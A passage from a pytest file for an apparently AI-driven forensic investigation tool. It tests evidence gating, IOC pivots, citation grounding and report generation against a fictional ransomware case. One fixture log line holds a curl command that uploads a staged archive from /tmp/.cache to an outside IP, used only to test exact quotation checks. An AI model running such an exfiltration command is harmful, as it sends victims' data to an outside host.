    used, window = dair_window_used(Log(["dair_call"] + ["tool_call"] * 7))
    assert (used, window) == (7, middleware.DAIR_WINDOW)
    assert dair_window_used(Log(["tool_call"] * 5))[0] == 0          # cold start: nothing counted
    assert dair_window_used(Log(["tool_call"] * 30))[0] == 0         # aged out: the gate speaks
    assert dair_window_used(Log(["tool_call", "dair_call"]))[0] == 0


def test_dair_window_nudge_fires_one_batch_before_expiry(monkeypatch):
    from agent import loop as loop_mod
    from agent.llm import ChatResponse, ToolCall
    from core import middleware
    from tests.agent.test_loop_reliability import _finish_response, _ScriptedClient, _StubToolbox
    monkeypatch.setattr(loop_mod, "MAX_WALL_SECONDS", 0.0)

    class _Toolbox(_StubToolbox):
        def call(self, *a, **kw):
            return ('{"success": true, "match_count": 1}', [])

    def _agent(client):
        return loop_mod.Agent(client, _Toolbox(), case_dir=None, quiet=True)

    def run_with(used):
        monkeypatch.setattr(middleware, "dair_window_used", lambda log=None: (used, 20))
        client = _ScriptedClient([
            ChatResponse(content="", tool_calls=[ToolCall(id="1", name="strings_strings_grep",
                                                          arguments={"file_path": "/x", "pattern": "y"})]),
            _finish_response()])
        agent = _agent(client)
        agent.run("sys", "user")
        return [m for m in agent.messages if m.get("role") == "user" and "[dair window]" in str(m.get("content"))]
    assert run_with(16), "16 of 20 used: the nudge must fire"
    assert not run_with(3), "3 of 20 used: no nudge"
    assert not run_with(0), "cold start or aged out: the gate speaks, not the nudge"


def test_no_attributed_indicator_means_no_pivot(tmp_path):
    from tests.core.test_ioc_pivots import _case
    import core.ioc_pivots as ip
    case = _case(tmp_path, sources=("evidence/firewall/fw.log", "exports/Security.evtx"),
                 claims=("Firewall log 2031-02-04 shows 600 drops; the firewall itself is 10.0.0.254. "
                         "The shares directory holds report_1-10.xlsx and staff_2031.xlsx.",))
    assert ip.indicators_from_beliefs(case) == {}
    ip.refresh_pivots(case)
    assert ip.open_pivots(case) == []


def test_account_sid_label_is_not_a_principal(tmp_path):
    from core.claim_graph import upsert_claim_from_finding
    from core.ioc_catalog import build_catalog
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    r = upsert_claim_from_finding(case, statement=(
        "Local account 'tempadmin' created by jane.doe — Security event 4720. "
        "Account SID: S-1-5-21-1111111111-2222222222-3333333333-1002."), confidence="SUSPECTED")
    assert r["success"], r
    values = {i.get("value") for i in _every_row(build_catalog(case))}
    assert "tempadmin" in values and "SID" not in values and "sid" not in values


def test_firewall_drops_are_not_an_attacker_action(tmp_path):
    from core.claim_graph import upsert_claim_from_finding
    from core.ioc_catalog import build_catalog
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    for stmt in ("Firewall log 2031-02-04 shows 600 dropped connections out of 80,000 events; "
                 "the only address present is 10.0.0.254, the firewall itself.",
                 "Traffic from 10.0.0.254 was dropped by rule 12 (action=drop)."):
        assert upsert_claim_from_finding(case, statement=stmt, confidence="SUSPECTED")["success"]
    assert _every_row(build_catalog(case)) == []
    r = upsert_claim_from_finding(case, statement="The attacker dropped mimikatz.exe in C:\\Temp and beaconed to 203.0.113.9.", confidence="LIKELY")
    values = {i.get("value") for i in _every_row(build_catalog(case))}
    assert "203.0.113.9" in values and "mimikatz.exe" in values


def test_pivot_closes_on_the_search_as_the_analyst_writes_it(tmp_path):
    from tests.core.test_ioc_pivots import _case
    import core.ioc_pivots as ip
    case = _case(tmp_path, sources=("exports/CORP-SRV01_Security.evtx", "evidence/firewall/2031-02-04.log"),
                 claims=(r"Local account tempadmin created by EXAMPLE\jane.doe from 10.0.1.51 (event 4720).",))
    ip.refresh_pivots(case)
    iocs = {p["ioc"] for p in ip.open_pivots(case)}
    assert any(i.startswith("account:") for i in iocs) and "ip:10.0.1.51" in iocs
    # regex alternation of the name parts, over the CSV parsed from the evtx
    ip.observe_search(case, blob='table_table_grep {"path": "/c/exports/CORP-SRV01_Security.csv", "pattern": "jane|doe"}')
    # escaped IP over the firewall log
    ip.observe_search(case, blob='table_table_grep {"path": "evidence/firewall/2031-02-04.log", "pattern": "10\\\\.0\\\\.1\\\\.51"}')
    pending = {p["ioc"]: p["pending"] for p in ip.open_pivots(case)}
    assert not any("CORP-SRV01_Security" in t for t in pending.get(next(i for i in iocs if i.startswith("account:")), []))
    assert not any("2031-02-04" in t for t in pending.get("ip:10.0.1.51", []))
    # a surname alone is not that search
    assert ip._indicator_searched("account:example/jane.doe", "grep doe security.csv") is False
    assert ip._indicator_searched("host:corp-srv01", "grep srv01 security.csv") is True


def test_python_tool_results_are_retained_for_citation(tmp_path, monkeypatch):
    from core import middleware
    from core.execution_log import ExecutionLog, TRACE_EXCERPT_CHARS
    from tools.misc import _auto_fill_supporting_evidence
    from tools._gates._citation import deterministic_cite_check
    case = tmp_path / "C"; (case / "analysis").mkdir(parents=True); (case / "evidence").mkdir()
    log = ExecutionLog(); log.configure("C", str(case / "analysis" / "trace.json"), save_session=False)
    monkeypatch.setattr("core.execution_log.log", log)
    rows = [{"TimeCreated": f"2031-02-04 12:00:{i:02d}", "IpAddress": "10.0.1.51", "pad": "x" * 60} for i in range(60)]
    result = {"success": True, "matched_rows": 60, "returned_rows": 60, "rows": rows}
    middleware._trace_success_baseline("table_table_query", 0.2, len(log._entries), result=result,
                                       args={"path": "exports/Security.csv"})
    e = log._entries[-1]
    assert "10.0.1.51" in (e.get("stdout_excerpt") or "")
    assert len(e["stdout_excerpt"]) <= TRACE_EXCERPT_CHARS
    assert e.get("stdout_file") and "2031-02-04 12:00:59" in open(e["stdout_file"]).read()
    desc = "jane.doe authenticated from 10.0.1.51 at 2031-02-04 12:00:59 UTC."
    filled, added = _auto_fill_supporting_evidence(description=desc, supporting_evidence="",
                                                   input_call_ids=[e["call_id"]], linked_call_id=e["call_id"], log=log)
    assert deterministic_cite_check(desc, filled)["uncited_claims"] == [] and added == []


def test_a_lookup_echo_is_never_cited_as_where_a_value_was_seen(tmp_path, monkeypatch):
    from core.execution_log import ExecutionLog
    from tools.misc import _auto_fill_supporting_evidence
    case = tmp_path / "C"; (case / "analysis").mkdir(parents=True)
    log = ExecutionLog(); log.configure("C", str(case / "analysis" / "trace.json"), save_session=False)
    monkeypatch.setattr("core.execution_log.log", log)
    lookup = log.record_tool_call("<py>:enrich_vt_lookup_ip", True, False, 0, 0,
                                  stdout_excerpt='{"ip": "198.51.100.7", "malicious": 9}')
    desc = "The workstation beaconed to 198.51.100.7."
    kw = dict(description=desc, supporting_evidence="", input_call_ids=[lookup], linked_call_id=lookup, log=log)
    assert "198.51.100.7" not in _auto_fill_supporting_evidence(**kw)[0]
    seen = log.record_tool_call("<py>:net_tshark_query", True, False, 0, 0,
                                stdout_excerpt="10.0.0.5 -> 198.51.100.7:443 SYN")
    filled, added = _auto_fill_supporting_evidence(**kw)
    assert "198.51.100.7" in filled and f"call_id={seen}" in filled and added == [seen]


def test_subprocess_stdout_between_excerpt_and_cap_is_kept(tmp_path, monkeypatch):
    from core import executor
    from core.execution_log import ExecutionLog, TRACE_EXCERPT_CHARS
    case = tmp_path / "C"; (case / "analysis").mkdir(parents=True)
    log = ExecutionLog(); log.configure("C", str(case / "analysis" / "trace.json"), save_session=False)
    monkeypatch.setattr("core.execution_log.log", log)
    text = "\n".join(f"r/r {i}-128-1: file{i}.docx.locked" for i in range(400))
    assert len(text) > TRACE_EXCERPT_CHARS
    result = {"cmd": "fls -o 2048 img.raw", "success": True, "truncated": False, "retries": 0,
              "exit_code": 0, "stderr": "", "stdout": text, "elapsed_seconds": 0.1}
    executor._log_tool(result)
    e = log._entries[-1]
    assert e.get("stdout_file") and "file399.docx.locked" in open(e["stdout_file"]).read()


def test_directory_names_in_domain_position_are_not_accounts(tmp_path):
    from core.claim_graph import upsert_claim_from_finding
    from core.ioc_catalog import build_catalog
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    r = upsert_claim_from_finding(case, statement=(
        "Encrypted copies with .locked appear across user directories (John.Smith, Jane.Doe) and "
        "system paths (ProgramData\\Microsoft\\User Account Pictures); EXAMPLE\\tempadmin created them."),
        confidence="LIKELY")
    assert r["success"], r
    values = {i.get("value").lower() for i in _every_row(build_catalog(case))}
    assert "user" not in values and "microsoft" not in values
    assert "tempadmin" in values


def test_named_actor_gate_only_accuses_name_shaped_tokens():
    from tools._gates.named_actor_attribution_grounding import _name_shaped, _NAME_STOPS, _NAME_RE
    desc = ("setup-x64(1).exe downloaded to CORP-SRV01 at .\\data\\public\\USERS\\Jane.Doe\\Downloads "
            "on 2031-02-04. When the Backup Folder was copied to .\\Users\\user01\\Desktop it was transferred.")
    names = {t for t in _NAME_RE.findall(desc) if t not in _NAME_STOPS and _name_shaped(t, desc)}
    assert names == {"Jane", "Doe"}, names
    assert _name_shaped("Alice", "Alice Smith copied the archive.")
    assert _name_shaped("Alice", "Alice's session copied the archive.")
    assert not _name_shaped("Users", r"copied from C:\Users\public\Desktop")


def test_absence_contradiction_skips_the_searched_container():
    from core.artifact_value import _names_a_container
    stmt = ("SHA256 0f1e2d3c4b5a6978 absent from the observed CSVs (CORP-SRV01_4624_all.csv, "
            "CORP-SRV01_4720.csv); the hash string was not found in CORP-SRV01_PowerShell_4104.csv.")
    assert _names_a_container(stmt, "corp-srv01_4624_all.csv")
    assert _names_a_container(stmt, "corp-srv01_4720.csv")
    assert _names_a_container(stmt, "corp-srv01_powershell_4104.csv")
    assert not _names_a_container("Security.evtx was not found on CORP-SRV01.", "security.evtx")
    assert not _names_a_container("No Security.evtx present in the winevt listing.", "security.evtx")
    assert not _names_a_container("PsExec64.exe is absent from Amcache.hve.", "psexec64.exe")
    assert _names_a_container("PsExec64.exe is absent from Amcache.hve.", "amcache.hve")


def test_timeline_events_are_parsed_once_per_file(tmp_path, monkeypatch):
    import json as _json
    from core import evidence_resolver as er
    case = tmp_path / "C"; tb = case / "reports" / ".timeline_build"; tb.mkdir(parents=True)
    f = tb / "events.jsonl"
    f.write_text("\n".join(_json.dumps({"ts": f"2031-02-04T10:{i:02d}:00Z", "host": "h1", "description": f"event {i}"}) for i in range(50)) + "\n")
    calls = {"n": 0}
    real = _json.loads
    def counting(s, *a, **k):
        calls["n"] += 1
        return real(s, *a, **k)
    monkeypatch.setattr(er.json, "loads", counting)
    a = er._timeline_events_jsonl(case); b = er._timeline_events_jsonl(case)
    assert len(a) == 50 and a is b and calls["n"] == 50
    f.write_text(f.read_text() + _json.dumps({"ts": "2031-02-04T11:00:00Z", "host": "h1", "description": "late"}) + "\n")
    import os, time
    os.utime(f, (time.time() + 5, time.time() + 5))
    assert len(er._timeline_events_jsonl(case)) == 51            # a changed file is re-read


def test_open_task_is_answered_by_the_findings_that_speak_to_it():
    from core.answer_synthesis import answer_for_task
    nodes = {
        "C0003": {"id": "C0003", "kind": "claim", "status": "new", "confidence": "SUSPECTED", "host": "",
                  "statement": "Firewall logs are appliance exports; src and dst columns are empty, so they cannot support IP-based exfiltration analysis."},
        "C0012": {"id": "C0012", "kind": "claim", "status": "new", "confidence": "LIKELY", "host": "CORP-SRV01",
                  "statement": "7z-x64.exe was downloaded to CORP-SRV01 and an archive was staged before the ransom note appeared."},
        "C0017": {"id": "C0017", "kind": "claim", "status": "new", "confidence": "LIKELY", "host": "CORP-SRV01",
                  "statement": "The ransom note claims data was stolen and encrypted; no upload or transfer artifact was recovered."},
    }
    task = {"id": "task-0002", "status": "in_progress", "related_claim_ids": ["C0003"],
            "text": "Are there signs of Data Exfiltration and if yes which data got extracted?"}
    a = answer_for_task(task, {"nodes": nodes})
    ids = [n["id"] for n in a["supporting"]]
    assert a["by_relevance"] and "C0012" in ids and "C0017" in ids
    assert ids[0] != "C0003"                       # the overlap-linked description no longer leads
    done = dict(task, status="answered")
    b = answer_for_task(done, {"nodes": nodes})
    assert not b["by_relevance"] and [n["id"] for n in b["supporting"]] == ["C0003"]   # a closed task keeps its answer


def test_tabular_refusal_names_the_sqlite_parser(tmp_path):
    from tools.tabular import table_schema
    db = tmp_path / "SyncEngineDatabase.db"; db.write_bytes(b"SQLite format 3\x00" + b"\x00" * 200)
    r = table_schema(str(db))
    assert r["success"] is False and "ez.sqlecmd" in r["error"]


def test_management_summary_technical_depth_is_detected():
    from core.report_projection import technical_depth
    tech = technical_depth("The tempadmin account was created (EID 4720) by S-1-5-21-1-2-3-1124 and PsExec64.exe ran; see F-012 and 10.0.1.51.")
    assert len(tech) >= 4
    assert technical_depth("An administrator account was misused to create a hidden account on the file server, "
                           "which then encrypted 20 files. Data theft is claimed but unproven.") == []


def test_yes_no_answers_need_a_finding_that_addresses_the_question():
    from core.answer_synthesis import synthesize_answer, _plain_headline
    ransom = {"id": "C2", "kind": "claim", "status": "new", "confidence": "CONFIRMED", "host": "CORP-SRV01",
              "statement": "Ransomware encryption on CORP-SRV01: 20 files with .locked extension, window 12:00–14:00 UTC."}
    staged = {"id": "C9", "kind": "claim", "status": "new", "confidence": "LIKELY", "host": "CORP-SRV01",
              "statement": "An archive of the project share was staged and uploaded to a cloud storage service before the encryption."}
    a = synthesize_answer("Are there signs of data exfiltration?", [ransom])
    assert a["text"].startswith("Not established") and "Related: Ransomware" in a["text"]
    b = synthesize_answer("Are there signs of data exfiltration?", [ransom, staged])
    assert b["text"].startswith("Yes — Archive of the project share was staged")
    c = synthesize_answer("What type of attack happened?", [ransom, staged])
    assert c["text"].startswith("Ransomware encryption on CORP-SRV01")
    assert _plain_headline("Local account 'tempadmin' created on CORP-SRV01 by jane.doe — Security event 4720 at 2031-02-04 12:00:00 UTC. Account SID: S-1-5-21-1-2-3-1002.") == "Local account 'tempadmin' created on CORP-SRV01 by jane.doe"


def test_open_task_answer_is_not_a_pasted_statement():
    from core.answer_synthesis import answer_for_task
    long = ("Local account 'tempadmin' created on CORP-SRV01 by jane.doe — Security event 4720 at 2031-02-04 12:00:00 UTC. "
            "Account SID: S-1-5-21-1-2-3-1002. Creator: EXAMPLE\\jane.doe (S-1-5-21-9-9-9-1124), SubjectLogonId 0x3E7A1B.")
    nodes = {"C5": {"id": "C5", "kind": "claim", "status": "new", "confidence": "LIKELY", "host": "CORP-SRV01", "statement": long}}
    a = answer_for_task({"text": "Was a new account created, and by whom?", "status": "answered", "related_claim_ids": ["C5"]},
                        {"nodes": nodes}, {"C5": "A very long narrative summary " * 20})
    assert a["text"].startswith("Yes — Local account 'tempadmin' created on CORP-SRV01 by jane.doe")
    assert "SubjectLogonId" not in a["text"] and "narrative summary" not in a["text"]


def test_ioc_tab_context_comes_from_the_claims_and_the_pivot_ledger(tmp_path):
    import json as _json
    from core.claim_graph import upsert_claim_from_finding
    from dashboard.read_models import ioc_catalog_with_context
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    r = upsert_claim_from_finding(case, statement="The attacker beaconed to 203.0.113.44 from CORP-SRV01.", confidence="LIKELY", host="CORP-SRV01")
    assert r["success"], r
    (case / ".atlas" / "ioc_pivots.json").write_text(_json.dumps({"schema_version": "1.0", "pivots": {
        "ip:203.0.113.44": {"origin": r["claim_id"], "targets": {"evidence/fw/a.log": "searched", "evidence/fw/b.log": "pending"}}}}))
    cat = ioc_catalog_with_context(case)
    ip = next(i for i in cat["iocs"] + cat["review"] if i["value"] == "203.0.113.44")
    assert ip["claims"][0]["id"] == r["claim_id"] and "beaconed" in ip["claims"][0]["statement"]
    assert ip["searched"] == ["evidence/fw/a.log"] and ip["pending"] == ["evidence/fw/b.log"]
    assert cat["groups"]


def test_fallback_summary_reads_as_prose_without_finding_ids(tmp_path):
    from core.report_projection import deterministic_section_generator
    ctx = {"section_id": "exec_summary", "title": "1. Executive Summary", "report_scope": "case",
           "claims": [{"id": "C0001", "finding_id": "F-001", "confidence": "LIKELY", "host": "CORP-SRV01",
                       "statement": "Ransomware encryption on CORP-SRV01: 20 files (EID 4663)."}],
           "conclusions": [], "conflicts": []}
    prose = deterministic_section_generator(ctx, {"id": "exec_summary"})
    assert "F-001" not in prose and "EID" not in prose and "Ransomware encryption" in prose


def test_dair_gate_lets_a_batch_that_started_inside_the_window_finish(monkeypatch):
    from core import middleware as mw

    class Log:
        def __init__(self, types):
            self._entries = [{"type": t} for t in types]
        def recent_actions(self, n):
            return [e for e in self._entries if e["type"] in ("tool_call", "dair_call")][-n:]
        def deferred_backlog_status(self):
            return {"latched": False, "open": 0, "cap": 10, "hysteresis": 5}
    log = Log(["dair_call"] + ["tool_call"] * 15)
    monkeypatch.setattr("core.execution_log.log", log)
    mw.end_batch()
    assert mw._gate_decision()[0] is False           # five actions of room
    assert mw.begin_batch() is True
    log._entries += [{"type": "tool_call"}] * 10     # the batch ran past the window
    assert mw._gate_decision()[0] is False           # …and finishes
    mw.end_batch()
    assert mw._gate_decision()[0] is True            # the next batch must re-engage
    assert mw.begin_batch() is False and mw._gate_decision()[0] is True
    mw.end_batch()
    monkeypatch.setattr(mw, "DAIR_BATCH_GRACE", 0)
    log2 = Log(["dair_call"] + ["tool_call"] * 15)
    monkeypatch.setattr("core.execution_log.log", log2)
    assert mw.begin_batch() is False                 # switch off: per-call checks as before
    mw.end_batch()


def test_tasks_link_by_the_answer_rules(tmp_path):
    import json as _json
    from core.investigation_tasks import link_claim_to_tasks, load_tasks
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    (case / ".atlas" / "investigation_tasks.json").write_text(_json.dumps({
        "schema_version": "1.0", "case_id": "C", "next_id": 3, "tasks": [
            {"id": "task-0001", "text": "Are there signs of data exfiltration and if yes which data got extracted?",
             "status": "open", "related_claim_ids": [], "created_at": "x", "updated_at": "x"},
            {"id": "task-0002", "text": "Was a new account created, and by whom?",
             "status": "open", "related_claim_ids": [], "created_at": "x", "updated_at": "x"}]}))
    link_claim_to_tasks(case, "C0003", statement="Firewall logs are appliance exports; the src and dst columns are empty, "
                        "so they cannot support IP-based exfiltration analysis.", host="")
    link_claim_to_tasks(case, "C0005", statement="Local account tempadmin was created on SRV-01 by jane.doe (event 4720).", host="SRV-01")
    link_claim_to_tasks(case, "C0017", statement="An archive of the project share was uploaded to a cloud storage service.", host="SRV-01")
    tasks = {t["id"]: t for t in load_tasks(case)["tasks"]}
    assert tasks["task-0001"]["related_claim_ids"] == ["C0017"]        # the meta-note no longer links
    assert tasks["task-0002"]["related_claim_ids"] == ["C0005"]


def test_dashboard_stop_returns_at_once_and_kills_only_after_the_grace():
    import subprocess, time
    from dashboard.run_manager import _graceful_stop

    class Proc:
        def __init__(self):
            self.signals, self.killed, self.waits = [], False, 0
        def send_signal(self, sig):
            self.signals.append(sig)
        def wait(self, timeout=None):
            self.waits += 1
            if self.killed:
                return 0
            time.sleep(min(float(timeout or 0), 0.5))   # a real wait blocks for its timeout
            raise subprocess.TimeoutExpired("atlas", timeout)
        def kill(self):
            self.killed = True
    proc = Proc()
    t0 = time.time()
    r = _graceful_stop(proc, grace=3.4)
    assert r["success"] and r["stopping"] and time.time() - t0 < 3.4
    assert not proc.killed                     # still writing its report
    deadline = time.time() + 4
    while not proc.killed and time.time() < deadline:
        time.sleep(0.1)
    assert proc.killed                         # the reaper fired after the grace


def test_exit_report_is_the_full_projection_with_a_findings_only_floor(tmp_path, monkeypatch):
    import types
    from core.claim_graph import upsert_claim_from_finding
    from core.report_projection import load_manifest
    from agent import cli
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True); (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: C\n\n**Case ID:** C\n", encoding="utf-8")
    assert upsert_claim_from_finding(case, statement="Ransomware encrypted 20 files on SRV-01.", confidence="LIKELY")["success"]
    agent = types.SimpleNamespace(stats={"stopped_reason": "keyboard_interrupt"}, _report_written=lambda: False)
    import core.investigation_state as inv
    monkeypatch.setattr(inv, "project_report_from_state",
                        lambda case_dir, **kw: {"success": True, "markdown": "# Report\n\n## 1. Executive Summary\n\nprose",
                                                 "regenerate": {"fallbacks": []}})
    cli._ensure_report_on_exit(case, agent)
    out = case / "reports" / "C_investigation_report.md"
    text = out.read_text(encoding="utf-8")
    assert "Written at run end (keyboard_interrupt)" in text and "prose" in text
    assert "without the narrative sections" not in text
    assert load_manifest(case)["last_deliverable_source"] == "projected_on_exit"
    # the projection fails: the findings-only assembly is the floor, and says so
    def boom(case_dir, **kw):
        raise RuntimeError("no provider")
    monkeypatch.setattr(inv, "project_report_from_state", boom)
    agent2 = types.SimpleNamespace(stats={"stopped_reason": "turn_budget"}, _report_written=lambda: False)
    cli._ensure_report_on_exit(case, agent2)
    text = out.read_text(encoding="utf-8")
    assert "without the narrative sections" in text and "Ransomware" in text
    assert load_manifest(case)["last_deliverable_source"] == "auto_assembled_on_exit"


def test_timeline_cache_keeps_only_resolver_fields_and_shares_repeated_values(tmp_path):
    import json as _json
    from core import evidence_resolver as er
    case = tmp_path / "C"; tb = case / "reports" / ".timeline_build"; tb.mkdir(parents=True)
    rows = [{"timestamp": f"2031-02-04T10:{i:02d}:00Z", "host": "SRV-01", "user": "jane.doe", "event_type": "logon",
             "description": f"event {i}", "big_unused_blob": "x" * 500, "original_tool": "evtxecmd"} for i in range(20)]
    (tb / "events.jsonl").write_text("\n".join(_json.dumps(r) for r in rows) + "\n")
    er._TIMELINE_CACHE.clear()
    ev = er._timeline_events_jsonl(case)
    assert len(ev) == 20 and "big_unused_blob" not in ev[0] and ev[0]["description"] == "event 0"
    assert ev[0]["host"] is ev[19]["host"] and ev[0]["user"] is ev[5]["user"]


def test_missing_binaries_names_the_namespace(monkeypatch):
    import shutil
    from tools import tool_capabilities as tc
    monkeypatch.setattr(shutil, "which", lambda b: None if b == "qemu-img" else "/usr/bin/" + b)
    assert ("img", "qemu-img") in tc.missing_binaries()
    assert not any(b == "fls" for _, b in tc.missing_binaries())



def test_section_generation_stops_calling_a_failing_provider(monkeypatch):
    import core.report_projection as rp
    calls = {"n": 0}
    def failing(ctx, sec):
        calls["n"] += 1
        raise RuntimeError("connection refused")
    monkeypatch.setattr(rp, "default_llm_section_generator", failing)
    rp._PROVIDER_DOWN_UNTIL[0] = 0.0
    ctx = {"section_id": "exec_summary", "title": "1. Executive Summary", "report_scope": "case",
           "claims": [{"id": "C0001", "finding_id": "F-001", "confidence": "LIKELY", "statement": "Ransomware on SRV-01."}],
           "conclusions": [], "conflicts": []}
    for _ in range(4):
        sec = {"id": "exec_summary"}
        assert rp.resilient_section_generator(ctx, sec)
        assert sec["generator"] == "deterministic_fallback"
    assert calls["n"] == 1                       # one failure, then the cooldown
    rp._PROVIDER_DOWN_UNTIL[0] = 0.0


class TestSessionBeaconForeignCase:
    """A run launched inside a case must not resume the trace of another
    case named by the per-user session beacon."""

    def _case(self, root, name, with_trace):
        d = root / name
        (d / "analysis").mkdir(parents=True)
        (d / "CASE.md").write_text("# case")
        if with_trace:
            (d / "analysis" / f"{name}_trace.json").write_text(json.dumps({"case_id": name, "entries": []}))
        return d

    def _beacon(self, tmp_path, monkeypatch, case_dir, name):
        import core.execution_log as elog
        beacon = tmp_path / "beacon.json"
        beacon.write_text(json.dumps({"case_id": name, "path": str(case_dir / "analysis" / f"{name}_trace.json")}))
        monkeypatch.setattr(elog, "_SESSION_FILE", str(beacon))
        return elog

    def test_other_case_beacon_is_ignored_inside_a_case(self, tmp_path, monkeypatch):
        old = self._case(tmp_path, "CASE-A", True)
        new = self._case(tmp_path, "CASE-B", False)
        elog = self._beacon(tmp_path, monkeypatch, old, "CASE-A")
        monkeypatch.chdir(new)
        assert elog.ExecutionLog().case_dir() is None

    def test_same_case_beacon_resumes(self, tmp_path, monkeypatch):
        old = self._case(tmp_path, "CASE-A", True)
        elog = self._beacon(tmp_path, monkeypatch, old, "CASE-A")
        monkeypatch.chdir(old)
        assert os.path.realpath(elog.ExecutionLog().case_dir()) == os.path.realpath(str(old))

    def test_beacon_resumes_from_an_arbitrary_directory(self, tmp_path, monkeypatch):
        old = self._case(tmp_path, "CASE-A", True)
        elog = self._beacon(tmp_path, monkeypatch, old, "CASE-A")
        (tmp_path / "elsewhere").mkdir()
        monkeypatch.chdir(tmp_path / "elsewhere")
        assert os.path.realpath(elog.ExecutionLog().case_dir()) == os.path.realpath(str(old))


class TestActionWindowCountsModelCalls:
    """A tool that runs several subprocesses per call is one model action
    in the DAIR window, not one action per subprocess."""

    def _call(self, log, n):
        import core.execution_log as elog
        tok = elog.current_action_id.set(elog.next_action_id())
        try:
            for i in range(n):
                log.record_tool_call(f"strings -n {i} x", True, False, 0, 0)
        finally:
            elog.current_action_id.reset(tok)

    def test_multi_subprocess_call_counts_once(self):
        import core.execution_log as elog
        from core.middleware import dair_window_used
        log = elog.log
        log.record_dair_call("Triage", "", False, "", "", "stay", "")
        self._call(log, 2)
        self._call(log, 2)
        log.record_tool_call("<py>:hash_file", True, False, 0, 0)
        assert dair_window_used(log)[0] == 3
        assert len(log.recent_actions(2)) == 3
        assert len(log.recent_actions(1)) == 1
        assert any(e.get("type") == "dair_call" for e in log.recent_actions(4))
        assert not any(e.get("type") == "dair_call" for e in log.recent_actions(3))


class _FakeLog:
    def __init__(self, entries, case_dir=None):
        self._entries = entries
        self._cd = case_dir

    def case_dir(self):
        return self._cd

    def index(self):
        return {e.get("call_id"): e for e in self._entries}


def _gate_ctx(description, entries, **kw):
    from tools._gates import GateContext
    return GateContext(description=description, confidence="LIKELY", tier="LIKELY",
                       source="auth.log", linked_call_id=kw.get("linked", 0),
                       tested_hypothesis_id="", log=_FakeLog(entries), idx={},
                       window=list(entries), input_call_ids=kw.get("cids", []))


_REAL_LINE = ("May 14 09:44:20 web01 sudo: deploy : COMMAND=/usr/bin/curl -s -X POST "
              "--data-binary @/tmp/.cache/srv-data.tgz https://198.51.100.7:443/upload")


class TestQuotedTextGrounding:
    """A quotation in a finding must occur in a forensic tool output; the
    analyst's own earlier words do not count."""

    def test_verbatim_quote_from_tool_output_passes(self):
        from tools._gates import quoted_text_grounding as g
        entries = [{"type": "tool_call", "call_id": 5, "cmd": "strings -a x", "stdout_excerpt": _REAL_LINE}]
        desc = ("Data left the host: auth.log shows 'curl -s -X POST --data-binary "
                "@/tmp/.cache/srv-data.tgz https://198.51.100.7:443/upload' at 09:44:20Z")
        assert g.check(_gate_ctx(desc, entries, cids=[5])) is None

    def test_misremembered_quote_is_refused_even_when_a_reason_call_echoes_it(self):
        from tools._gates import quoted_text_grounding as g
        wrong = "curl -X POST -F file=@/tmp/.cache/srv-data.tgz http://198.51.100.7:443/upload"
        entries = [
            {"type": "tool_call", "call_id": 5, "cmd": "strings -a x", "stdout_excerpt": _REAL_LINE},
            {"type": "reason_call", "call_id": 6, "content": f"the log shows '{wrong}'"},
            {"type": "tool_call", "call_id": 7, "cmd": "<py>:reason_reason_evaluate_finding", "output": wrong},
        ]
        out = g.check(_gate_ctx(f"auth.log shows '{wrong}' at 09:44:20Z", entries, cids=[5, 6, 7]))
        assert out and out["gate"] == "quoted_text_grounding"
        assert "file=@" in out["error"]

    def test_quoted_names_are_not_checked(self):
        from tools._gates import quoted_text_grounding as g
        assert g.check(_gate_ctx("Attacker created the account 'svc-sync' on the host", [])) is None

    def test_a_quote_split_by_a_fixed_width_wrap_still_passes(self):
        """A dumper that wraps its output at a fixed column breaks a line
        inside a token. The quotation copied from the source carries no
        break, and is still the text the tool output shows; a quotation
        that differs in a character is still refused."""
        from tools._gates import quoted_text_grounding as g
        line = "-rw-r--r--   1 alice    staff      4096 Jan  1  2020 notes.txt"
        wrapped = ("..index.html..-rw-\n  r--r--   1 alice    staff      4096 "
                   "Jan  1  2020 notes.txt\n..README..")
        entries = [{"type": "tool_call", "call_id": 5, "cmd": "ngrep -q -I x", "stdout_excerpt": wrapped}]
        assert g.check(_gate_ctx(f"The listing shows '{line}' in the transfer", entries, cids=[5])) is None
        out = g.check(_gate_ctx(f"The listing shows '{line.replace('r--r--', 'rw-r--')}' in the transfer",
                                entries, cids=[5]))
        assert out and out["gate"] == "quoted_text_grounding"

    def test_own_words_entries(self):
        from core.forensic_citation import own_words_entry
        assert own_words_entry({"type": "reason_call"})
        assert own_words_entry({"type": "tool_call", "cmd": "<py>:misc_record_finding"})
        assert not own_words_entry({"type": "tool_call", "cmd": "strings -a x"})
        assert not own_words_entry({"type": "tool_call", "cmd": "<py>:table_table_grep"})


class TestMachineCitationMark:
    """A citation the finding tool wrote itself is marked in the finding,
    so the trace says which citations were machine-added, and shown without
    the mark where a report renders it."""

    def test_the_finding_keeps_the_mark_and_the_rendered_line_drops_it(self):
        from core.forensic_citation import MACHINE_CITATION_MARK
        from core.report_projection import deterministic_section_generator
        from tools.misc import _auto_fill_supporting_evidence
        entries = [{"type": "tool_call", "call_id": 5, "cmd": "strings -a x", "stdout_excerpt": _REAL_LINE}]
        filled, _ = _auto_fill_supporting_evidence(
            description="Data left the host for 198.51.100.7 over HTTPS",
            supporting_evidence="", input_call_ids=[5], linked_call_id=5, log=_FakeLog(entries))
        assert filled.startswith(MACHINE_CITATION_MARK) and "198.51.100.7" in filled
        node = {"id": "C0001", "finding_id": "F-001", "confidence": "LIKELY",
                "statement": "Data left the host for 198.51.100.7 over HTTPS",
                "evidence": [{"artifact": "supporting_evidence", "locator": filled, "call_id": 5}]}
        md = deterministic_section_generator(
            {"section_id": "detailed_findings", "title": "Detailed Findings",
             "claims": [node], "resolved_evidence": {}}, {})
        assert "198.51.100.7" in md and MACHINE_CITATION_MARK not in md


class TestHostInferredFromDescription:
    def test_single_named_case_host_is_taken(self, tmp_path):
        from tools.misc import _infer_host_from_description
        (tmp_path / ".atlas").mkdir()
        (tmp_path / ".atlas" / "evidence_links.json").write_text(json.dumps(
            {"entries": [{"label": "LNX-WEB01", "kind": "disk", "path": "evidence/LNX-WEB01.img"}]}))
        log = _FakeLog([], case_dir=str(tmp_path))
        host, note = _infer_host_from_description("Persistence on LNX-WEB01 via a cron job", log)
